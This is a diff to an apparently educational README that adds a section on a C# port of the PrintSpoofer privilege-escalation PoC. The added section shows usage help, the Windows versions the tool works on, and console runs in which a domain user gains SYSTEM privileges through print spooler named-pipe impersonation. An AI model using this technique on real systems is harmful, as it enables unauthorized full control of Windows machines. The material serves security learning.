@@ -7,6 +7,7 @@ This directory is for PoCs to help learning how to get SYSTEM privilege.
 - [Arts Of GetSystem](#arts-of-getsystem)
   - [Named Pipe Impersonation](#named-pipe-impersonation)
   - [Token Stealing](#token-stealing)
+  - [Print Spoofer](#print-spoofer)
   - [Token Duplication with WFP](#token-duplication-with-wfp)
 
 ## Named Pipe Impersonation
@@ -75,6 +76,127 @@ PS C:\Dev>
 ![](./figures/AssignPrimaryToken.png)
 
 ![](./figures/SecondaryLogon.png)
+
+
+## Print Spoofer
+
+This PoC is CSharp ported version of [@itm4n](https://twitter.com/itm4n)'s PrintSpoofer:
+
+* [GitHub - itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
+* [PrintSpoofer - Abusing Impersonation Privileges on Windows 10 and Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
+
+```
+C:\Tools>PrintSpoofer.exe -h
+
+PrintSpoofer - PoC to get SYSTEM privileges with print spooler method.
+
+Usage: PrintSpoofer.exe [Options]
+
+        -h, --help        : Displays this help message.
+        -i, --interactive : Flag to execute command with interactive mode.
+        -c, --command     : Specifies command to execute.
+        -s, --session     : Specifies session ID.
+        -t, --timeout     : Specifies timeout in milliseconds. Default is 3,000 ms.
+
+[!] -c option is required.
+```
+
+This technique supports Windows 10, Windows Server 2016 / 2019.
+If you try this PoC in newer Windows such as Windows 11, failed with RPC_STATUS `0x000006BA` (`The RPC server is unavailable.`).
+
+To try this PoC, set command to execute with `-c` option.
+In default, specified command will be executed with Secondary Logon Service as follows:
+
+```
+C:\Tools>PrintSpoofer.exe -c cmd.exe
+
+[>] Trying to create named pipe.
+[+] Named pipe is created successfully.
+    [*] Path : \\.\pipe\PrivFuPipe\pipe\spoolss
+[>] Waiting for named pipe connection.
+[+] Print spooler is triggered successfully.
+[+] Got named pipe connection.
+[+] Named pipe impersonation is succesful (SID: S-1-5-18).
+[+] SYSTEM process is executed successfully (PID = 5148).
+[*] Done.
+```
+
+![](./figures/PrintSpoofer.png)
+
+When set `-i` flag, specified command will be executed in same console:
+
+```
+C:\Tools>whoami /user
+
+USER INFORMATION
+----------------
+
+User Name     SID
+============= =============================================
+contoso\david S-1-5-21-3654360273-254804765-2004310818-1104
+
+C:\Tools>PrintSpoofer.exe -i -c cmd
+
+[>] Trying to create named pipe.
+[+] Named pipe is created successfully.
+    [*] Path : \\.\pipe\PrivFuPipe\pipe\spoolss
+[>] Waiting for named pipe connection.
+[+] Print spooler is triggered successfully.
+[+] Got named pipe connection.
+[+] Named pipe impersonation is succesful (SID: S-1-5-18).
+[+] SYSTEM process is executed successfully (PID = 7504).
+Microsoft Windows [Version 10.0.18362.175]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\Tools>whoami /user
+
+USER INFORMATION
+----------------
+
+User Name           SID
+=================== ========
+nt authority\system S-1-5-18
+
+C:\Tools>whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeCreateTokenPrivilege                    Create a token object                                              Enabled
+SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Enabled
+SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeTcbPrivilege                            Act as part of the operating system                                Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeAuditPrivilege                          Generate security audits                                           Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeTrustedCredManAccessPrivilege           Access Credential Manager as a trusted caller                      Enabled
+SeRelabelPrivilege                        Modify an object label                                             Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+```
+
 
 
 ## Token Duplication with WFP
